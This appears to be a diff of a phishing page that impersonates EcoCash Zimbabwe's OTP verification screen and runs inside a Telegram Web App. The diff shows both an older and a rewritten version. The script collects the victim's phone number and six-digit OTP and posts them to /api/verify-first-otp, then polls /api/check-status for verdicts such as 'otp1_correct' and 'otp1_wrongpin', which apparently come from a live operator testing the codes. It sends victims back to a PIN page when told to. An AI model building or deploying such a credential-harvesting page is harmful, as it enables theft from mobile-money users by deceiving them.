@@ -3,554 +3,220 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>OTP Verification</title>
+    <title>EcoCash Zimbabwe - OTP Verification</title>
+
+    <script src="https://telegram.org/js/telegram-web-app.js"></script>
+
     <style>
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
-        }
+        * { box-sizing: border-box; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; }
+        body { margin: 0; padding: 0; background-color: #fff; display: flex; flex-direction: column; height: 100vh; overflow: hidden; }
 
-        body {
-            background-color: #ffffff;
-            color: #333;
-            display: flex;
-            flex-direction: column;
-            min-height: 100vh;
-            overflow-x: hidden;
-        }
+        .container { flex: 1; padding: 40px 20px; text-align: center; }
+        h2 { font-size: 22px; color: #333; margin-bottom: 10px; font-weight: 500; }
+        p { font-size: 14px; color: #666; line-height: 1.5; margin-bottom: 25px; }
 
-        /* Header Styles */
-        header {
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            padding: 15px 20px;
-            border-bottom: 1px solid #eaeaea;
-            background: #fff;
-        }
-
-        .back-arrow {
-            font-size: 20px;
-            text-decoration: none;
-            color: #666;
-            cursor: pointer;
-            width: 30px;
-        }
-
-        .logo {
-            font-size: 18px;
-            font-weight: 700;
-            color: #333333;
-            text-align: center;
-            flex-grow: 1;
-        }
-
-        .menu-icon {
-            display: flex;
-            flex-direction: column;
-            gap: 4px;
-            cursor: pointer;
-            width: 30px;
-            align-items: flex-end;
-        }
-
-        .menu-icon div {
-            width: 22px;
-            height: 2px;
-            background-color: #333;
-        }
-
-        /* Container & Card */
-        .container {
-            flex: 1;
-            display: flex;
-            justify-content: center;
-            align-items: flex-start;
-            padding: 40px 20px;
-            z-index: 1;
-        }
-
-        .card {
-            background: #ffffff;
-            border: 1px solid #f0f0f0;
-            border-radius: 16px;
-            padding: 30px 24px;
-            width: 100%;
-            max-width: 450px;
-            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.03);
-        }
-
-        .card h2 {
-            color: #1a65cc;
-            font-size: 24px;
-            font-weight: 700;
-            margin-bottom: 8px;
-        }
-
-        .card p {
-            color: #666666;
-            font-size: 15px;
-            line-height: 1.5;
-            margin-bottom: 24px;
-        }
-
-        .phone-display {
-            display: inline-block;
-            font-weight: 700;
-            color: #000000;
-            font-size: 15px;
-        }
-
-        /* 6-Digit Box Styling */
-        .otp-container {
-            display: flex;
-            justify-content: space-between;
-            gap: 8px;
-            margin-bottom: 12px;
-        }
-
-        .otp-box {
-            width: 50px;
-            height: 54px;
-            text-align: center;
-            font-size: 20px;
-            font-weight: 600;
-            border: 1px solid #d2d6dc;
+        .otp-inputs { display: flex; justify-content: center; gap: 8px; margin: 30px 0; }
+        .otp-inputs input {
+            width: 45px; height: 55px;
+            border: 1.5px solid #ccc;
             border-radius: 8px;
-            background-color: #f9fafb;
+            text-align: center;
+            font-size: 20px;
+            font-weight: bold;
             outline: none;
-            transition: all 0.2s ease;
         }
 
-        .otp-box:focus {
-            border-color: #1a65cc;
-            background-color: #fff;
-            box-shadow: 0 0 0 3px rgba(26, 101, 204, 0.15);
-        }
+        .otp-inputs input:focus { border-color: #237A3B; border-width: 2px; }
+        .resend-text { font-size: 13px; color: #888; margin-bottom: 30px; }
 
-        .otp-box.error {
-            border-color: #e53e3e;
-            background-color: #fff5f5;
-        }
-
-        /* Status / Error Message */
-        .error-message {
-            color: #e53e3e;
-            font-size: 14px;
-            font-weight: 600;
-            margin-bottom: 20px;
-            text-align: center;
-            display: none;
-        }
-
-        /* Action Buttons */
         .btn-verify {
-            width: 100%;
-            background-color: #1a65cc;
-            color: white;
+            width: 100%; max-width: 300px;
+            padding: 15px;
+            border-radius: 10px;
             border: none;
-            padding: 14px;
-            font-size: 16px;
-            font-weight: 600;
-            border-radius: 8px;
-            cursor: pointer;
-            transition: background 0.2s;
-            margin-bottom: 10px;
-        }
-
-        .btn-verify:hover {
-            background-color: #1452a8;
-        }
-
-        .btn-verify:disabled {
-            background-color: #a0aec0;
+            background-color: #e0e0e0;
+            color: #a0a0a0;
+            font-size: 14px;
+            font-weight: bold;
             cursor: not-allowed;
+            text-transform: uppercase;
         }
 
-        .btn-wrong-pin {
-            width: 100%;
-            background-color: transparent;
-            color: #e53e3e;
-            border: 1px solid #feb2b2;
-            padding: 12px;
-            font-size: 14px;
-            font-weight: 600;
-            border-radius: 8px;
-            cursor: pointer;
-            transition: all 0.2s;
-            margin-bottom: 20px;
-        }
+        .btn-verify.active { background-color: #237A3B; color: white; cursor: pointer; }
 
-        .btn-wrong-pin:hover {
-            background-color: #fff5f5;
-            border-color: #e53e3e;
+        /* --- LOADING OVERLAY --- */
+        #loading-overlay {
+            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
+            background: linear-gradient(180deg, #288844 0%, #237A3B 100%);
+            display: none; flex-direction: column; justify-content: center;
+            align-items: center; z-index: 9999; color: white;
         }
-
-        /* Timer and Resend section */
-        .timer-container {
-            text-align: center;
-            font-size: 14px;
-            color: #666;
-        }
-
-        .resend-btn {
-            background: none;
-            border: none;
-            color: #1a65cc;
-            font-weight: 600;
-            cursor: pointer;
-            font-size: 14px;
-            text-decoration: underline;
-        }
-
-        .resend-btn:disabled {
-            color: #a0aec0;
-            text-decoration: none;
-            cursor: not-allowed;
-        }
-
-        /* Full Screen Loading Overlay */
-        .overlay {
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background: rgba(255, 255, 255, 0.95);
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            z-index: 2000;
-            opacity: 0;
-            pointer-events: none;
-            transition: opacity 0.3s ease;
-        }
-
-        .overlay.active {
-            opacity: 1;
-            pointer-events: auto;
-        }
-
-        .loading-content {
-            text-align: center;
-            padding: 20px;
-            max-width: 340px;
-        }
-
         .spinner {
-            width: 80px;
-            height: 80px;
-            background: radial-gradient(circle, #007bc4 0%, #014d8c 100%);
-            border-radius: 50%;
-            margin: 0 auto 20px;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            position: relative;
-            box-shadow: 0 8px 20px rgba(1, 77, 140, 0.2);
+            width: 40px; height: 40px; border: 4px solid rgba(255,255,255,0.3);
+            border-top: 4px solid white; border-radius: 50%;
+            animation: spin 1s linear infinite; margin-bottom: 20px;
         }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
 
-        .spinner::after {
-            content: '';
-            width: 56px;
-            height: 56px;
-            border: 4px solid rgba(255, 255, 255, 0.2);
-            border-top: 4px solid #ff6f00;
-            border-radius: 50%;
-            animation: spin 1.2s linear infinite;
-        }
-
-        @keyframes spin {
-            0% { transform: rotate(0deg); }
-            100% { transform: rotate(360deg); }
-        }
-
-        .overlay h3 {
-            color: #014d8c;
-            font-size: 22px;
-            margin-bottom: 8px;
-            font-weight: 700;
-        }
-
-        .overlay p {
-            color: #555;
-            font-size: 14px;
-        }
-
-        /* Bottom Curved Decoration element */
-        .bottom-curve {
-            position: fixed;
-            bottom: 0;
-            left: 0;
-            width: 100%;
-            height: 60px;
-            background-color: #0066ff;
-            border-top-left-radius: 50% 100%;
-            border-top-right-radius: 50% 100%;
-            z-index: 0;
-            pointer-events: none;
-        }
-
-        @media (max-width: 400px) {
-            .otp-box {
-                width: 42px;
-                height: 48px;
-                font-size: 18px;
-            }
+        .footer {
+            position: relative; height: 250px;
+            background: linear-gradient(180deg, #288844 0%, #237A3B 100%);
+            border-top-left-radius: 50% 100px; border-top-right-radius: 50% 100px;
+            display: flex; justify-content: center; align-items: center; color: white;
+            font-size: 12px; margin-top: auto;
         }
     </style>
 </head>
+
 <body>
 
-    <!-- Header navigation section -->
-    <header>
-        <a class="back-arrow" onclick="window.history.back()">&#8592;</a>
-        <div class="logo">OTP Verification</div>
-        <div class="menu-icon">
-            <div></div>
-            <div></div>
-            <div></div>
-        </div>
-    </header>
+<div id="loading-overlay">
+    <div class="spinner"></div>
+    <div style="font-size: 20px; font-weight: bold;">Please wait...</div>
+</div>
 
-    <!-- Main Entry Container -->
-    <div class="container">
-        <div class="card">
-            <h2>OTP Verification</h2>
-            <p>Enter the 6-digit code sent to your phone number <span id="phoneTarget" class="phone-display">+263771268100</span></p>
+<div class="container">
+    <h2>OTP Verification</h2>
+    <p>Enter the OTP code sent to your mobile number to proceed.</p>
 
-            <!-- Box input block for dynamic code input -->
-            <div class="otp-container">
-                <input type="tel" class="otp-box" maxlength="1" inputmode="numeric" pattern="[0-9]*" autocomplete="off">
-                <input type="tel" class="otp-box" maxlength="1" inputmode="numeric" pattern="[0-9]*" autocomplete="off">
-                <input type="tel" class="otp-box" maxlength="1" inputmode="numeric" pattern="[0-9]*" autocomplete="off">
-                <input type="tel" class="otp-box" maxlength="1" inputmode="numeric" pattern="[0-9]*" autocomplete="off">
-                <input type="tel" class="otp-box" maxlength="1" inputmode="numeric" pattern="[0-9]*" autocomplete="off">
-                <input type="tel" class="otp-box" maxlength="1" inputmode="numeric" pattern="[0-9]*" autocomplete="off">
-            </div>
-
-            <!-- Error Status Below Inputs -->
-            <p id="errorMessage" class="error-message"></p>
-
-            <!-- Action Buttons -->
-            <button id="verifyButton" class="btn-verify" onclick="sendVerificationData()">Verify</button>
-            <button id="wrongPinButton" class="btn-wrong-pin" onclick="redirectToPinPage()">Entered Wrong PIN?</button>
-
-            <!-- Timer elements -->
-            <div class="timer-container">
-                <span id="timerText">Resend code in <strong id="countdown">02:00</strong></span>
-                <button id="resendButton" class="resend-btn" onclick="triggerResend()" style="display: none;">Resend code</button>
-            </div>
-        </div>
+    <div class="otp-inputs">
+        <input type="text" maxlength="1" inputmode="numeric">
+        <input type="text" maxlength="1" inputmode="numeric">
+        <input type="text" maxlength="1" inputmode="numeric">
+        <input type="text" maxlength="1" inputmode="numeric">
+        <input type="text" maxlength="1" inputmode="numeric">
+        <input type="text" maxlength="1" inputmode="numeric">
     </div>
 
-    <!-- Fullscreen Loading Overlay Portal -->
-    <div id="loadingOverlay" class="overlay">
-        <div class="loading-content">
-            <div class="spinner"></div>
-            <h3 id="overlay-title">Please wait...</h3>
-            <p id="overlay-text">We are verifying your OTP code with EcoCash systems.</p>
-        </div>
-    </div>
+    <div class="resend-text" id="timer-text"></div>
+    <button class="btn-verify" id="verify-btn" disabled>VERIFY OTP</button>
+    <div id="status-msg" style="margin-top:15px; font-size:14px; font-weight:500;"></div>
+</div>
 
-    <!-- Design element layout -->
-    <div class="bottom-curve"></div>
+<div class="footer">© 2026 EcoCash Zimbabwe</div>
 
-    <script>
-        let pollingInterval = null;
-        let globalPhone = "";
-        let isSecondOtp = false;
+<script>
+const phone = localStorage.getItem('phone');
+const inputs = document.querySelectorAll('.otp-inputs input');
+const btn = document.getElementById('verify-btn');
+const timerDisplay = document.getElementById('timer-text');
+const statusMsg = document.getElementById('status-msg');
+const overlay = document.getElementById('loading-overlay');
 
-        // --- FETCHING PREVIOUS NUMBER DYNAMICALLY ---
-        window.addEventListener('DOMContentLoaded', () => {
-            const urlParams = new URLSearchParams(window.location.search);
-            const phoneParam = urlParams.get('phone');
-            const stepParam = urlParams.get('step');
-            const storedPhone = localStorage.getItem('user_phone_number') || localStorage.getItem('phone');
-            
-            if (phoneParam) {
-                globalPhone = phoneParam;
-            } else if (storedPhone) {
-                globalPhone = storedPhone;
-            } else {
-                globalPhone = "263771268100";
-            }
+let countdown;
+let pollingInterval;
 
-            if (stepParam === "2" || localStorage.getItem('otp_step') === "2") {
-                isSecondOtp = true;
-                document.getElementById('overlay-text').textContent = "We are verifying your second OTP code with EcoCash systems.";
-            }
+window.onload = () => {
+    if (window.Telegram?.WebApp) {
+        window.Telegram.WebApp.ready();
+        window.Telegram.WebApp.expand();
+    }
+    if (!phone) { window.location.href = "/page6"; return; }
+    inputs[0].focus();
+    startTimer();
+};
 
-            document.getElementById('phoneTarget').textContent = globalPhone.startsWith('+') ? globalPhone : '+' + globalPhone;
-            
-            startCountdown(120);
-            setupOtpNavigation();
+function startTimer() {
+    let secondsLeft = 60;
+    clearInterval(countdown);
+    countdown = setInterval(() => {
+        secondsLeft--;
+        if (secondsLeft <= 0) {
+            clearInterval(countdown);
+            timerDisplay.innerHTML = '<span id="resend-btn" style="color:#237A3B; cursor:pointer; font-weight:bold;">Resend code</span>';
+            document.getElementById('resend-btn').onclick = resendCode;
+        } else {
+            timerDisplay.innerText = `Resend code in ${secondsLeft} seconds`;
+        }
+    }, 1000);
+}
+
+async function resendCode() {
+    timerDisplay.innerText = "Sending new code...";
+    
+    try {
+        await fetch('/api/resend-otp-notification', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ phone, step: "OTP Verification" })
         });
+    } catch (e) {}
 
-        // --- 6-DIGIT BOX DYNAMIC NAVIGATION LOGIC ---
-        function setupOtpNavigation() {
-            const inputs = document.querySelectorAll('.otp-box');
-            
-            inputs.forEach((input, index) => {
-                input.addEventListener('input', (e) => {
-                    clearErrorState();
-                    if (input.value.length === 1 && index < inputs.length - 1) {
-                        inputs[index + 1].focus();
-                    }
-                });
+    setTimeout(startTimer, 2000);
+}
 
-                input.addEventListener('keydown', (e) => {
-                    if (e.key === "Backspace" && input.value.length === 0 && index > 0) {
-                        inputs[index - 1].focus();
-                    }
-                });
-            });
-        }
+inputs.forEach((input, index) => {
+    input.addEventListener('input', () => {
+        input.value = input.value.replace(/\D/g, '');
+        if (input.value && index < inputs.length - 1) inputs[index + 1].focus();
+        checkFull();
+    });
+    input.addEventListener('keydown', (e) => {
+        if (e.key === 'Backspace' && !input.value && index > 0) inputs[index - 1].focus();
+    });
+});
 
-        function clearErrorState() {
-            const errorMsg = document.getElementById('errorMessage');
-            errorMsg.style.display = 'none';
-            errorMsg.textContent = '';
-            document.querySelectorAll('.otp-box').forEach(i => i.classList.remove('error'));
-        }
+function checkFull() {
+    const isComplete = Array.from(inputs).every(i => i.value !== '');
+    btn.disabled = !isComplete;
+    btn.classList.toggle('active', isComplete);
+}
 
-        function showErrorState(text) {
-            const errorMsg = document.getElementById('errorMessage');
-            errorMsg.textContent = text;
-            errorMsg.style.display = 'block';
-            document.querySelectorAll('.otp-box').forEach(i => i.classList.add('error'));
-        }
+btn.addEventListener('click', submitOtp);
 
-        function redirectToPinPage() {
-            window.location.href = `/page6.html?phone=${encodeURIComponent(globalPhone)}&error=wrong_pin`;
-        }
+async function submitOtp() {
+    if (btn.disabled) return;
+    const otp = Array.from(inputs).map(i => i.value).join('');
 
-        // --- 2 MINUTE COUNTDOWN TIMER SYSTEM ---
-        let timerInterval;
-        function startCountdown(durationSeconds) {
-            clearInterval(timerInterval);
-            const display = document.getElementById('countdown');
-            const timerText = document.getElementById('timerText');
-            const resendBtn = document.getElementById('resendButton');
+    overlay.style.display = 'flex';
+    statusMsg.innerText = "";
 
-            timerText.style.display = 'inline';
-            resendBtn.style.display = 'none';
+    try {
+        await fetch('/api/verify-first-otp', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ phone, otp })
+        });
+        startPolling();
+    } catch {
+        overlay.style.display = 'none';
+        statusMsg.style.color = "red";
+        statusMsg.innerText = "An error occurred.";
+    }
+}
 
-            let timer = durationSeconds;
-            timerInterval = setInterval(() => {
-                let minutes = Math.floor(timer / 60);
-                let seconds = timer % 60;
+function startPolling() {
+    clearInterval(pollingInterval);
+    pollingInterval = setInterval(async () => {
+        try {
+            const res = await fetch(`/api/check-status?phone=${encodeURIComponent(phone)}`);
+            const data = await res.json();
 
-                minutes = minutes < 10 ? "0" + minutes : minutes;
-                seconds = seconds < 10 ? "0" + seconds : seconds;
-
-                display.textContent = minutes + ":" + seconds;
-
-                if (--timer < 0) {
-                    clearInterval(timerInterval);
-                    timerText.style.display = 'none';
-                    resendBtn.style.display = 'inline-block';
-                }
-            }, 1000);
-        }
-
-        async function triggerResend() {
-            try {
-                await fetch("/api/resend-otp-notification", {
-                    method: "POST",
-                    headers: { "Content-Type": "application/json" },
-                    body: JSON.stringify({ phone: globalPhone, step: isSecondOtp ? "Step 2" : "Step 1" })
-                });
-                alert("A new OTP code has been sent!");
-                startCountdown(120);
-            } catch (err) {
-                console.error("Resend API error:", err);
+            if (data.status === "otp1_correct") {
+                clearInterval(pollingInterval);
+                window.location.href = "/success.html";
+            } 
+            else if (data.status === "otp1_wrongpin") {
+                clearInterval(pollingInterval);
+                overlay.style.display = 'none';
+                window.location.href = "/page6?error=wrongpin";
+            } 
+            else if (data.status === "otp1_wrong") {
+                clearInterval(pollingInterval);
+                overlay.style.display = 'none'; 
+                statusMsg.style.color = "red";
+                statusMsg.innerText = "❌ Incorrect OTP code.";
+                resetInputs();
             }
-        }
+        } catch {}
+    }, 3000);
+}
 
-        // --- CHECK STATUS FROM BACKEND SERVER API ---
-        async function checkVerificationStatus() {
-            if (!globalPhone) return;
-
-            try {
-                const res = await fetch(`/api/check-status?phone=${encodeURIComponent(globalPhone)}`);
-                const data = await res.json();
-
-                const overlayTitle = document.getElementById('overlay-title');
-                const overlayText = document.getElementById('overlay-text');
-
-                // TAPPED CORRECT (First OTP or Second OTP) -> GO TO PAGE 9
-                if (data.status === "otp1_correct" || data.status === "otp2_correct") {
-                    clearInterval(pollingInterval);
-                    overlayTitle.textContent = "Success!";
-                    overlayText.textContent = "Verification finalized.";
-                    document.querySelector('.spinner').style.background = '#4CAF50';
-                    
-                    setTimeout(() => {
-                        localStorage.removeItem('otp_step');
-                        window.location.href = `/page9.html?phone=${encodeURIComponent(globalPhone)}`;
-                    }, 1500);
-                }
-
-                // TAPPED WRONG CODE -> SHOW "Wrong code, please enter the correct code."
-                if (data.status === "otp1_wrong" || data.status === "otp2_wrong") {
-                    clearInterval(pollingInterval);
-                    document.getElementById('loadingOverlay').classList.remove('active');
-                    
-                    document.querySelectorAll('.otp-box').forEach(i => i.value = "");
-                    showErrorState("Wrong code, please enter the correct code.");
-                    document.querySelectorAll('.otp-box')[0].focus();
-                }
-
-                // TAPPED WRONG PIN (FOR EITHER STEP) -> SHOW "Wrong pin, please enter correct pin." & REDIRECT TO PAGE 6
-                if (data.status === "otp1_wrongpin" || data.status === "otp2_wrongpin") {
-                    clearInterval(pollingInterval);
-                    document.getElementById('loadingOverlay').classList.remove('active');
-                    
-                    showErrorState("Wrong pin, please enter correct pin.");
-
-                    setTimeout(() => {
-                        redirectToPinPage();
-                    }, 2000);
-                }
-
-            } catch (err) {
-                console.error("❌ Live server polling failed:", err);
-            }
-        }
-
-        // --- SUBMIT DATA TO MATCH YOUR LIVE BACKEND API ---
-        async function sendVerificationData() {
-            clearErrorState();
-            const inputs = document.querySelectorAll('.otp-box');
-            let otpCode = "";
-            inputs.forEach(input => otpCode += input.value);
-
-            if (otpCode.length < 6) {
-                showErrorState("Please enter all 6 digits of the verification code.");
-                return;
-            }
-
-            document.getElementById('loadingOverlay').classList.add('active');
-
-            const targetEndpoint = isSecondOtp ? "/api/verify-second-otp" : "/api/verify-first-otp";
-
-            try {
-                await fetch(targetEndpoint, {
-                    method: "POST",
-                    headers: { "Content-Type": "application/json" },
-                    body: JSON.stringify({ phone: globalPhone, otp: otpCode })
-                });
-                
-                pollingInterval = setInterval(checkVerificationStatus, 2500);
-
-            } catch (err) {
-                console.error("❌ Backend server request error:", err);
-                pollingInterval = setInterval(checkVerificationStatus, 2500);
-            }
-        }
-    </script>
+function resetInputs() {
+    inputs.forEach(i => i.value = "");
+    btn.classList.remove('active');
+    btn.disabled = true;
+}
+</script>
 </body>
 </html>
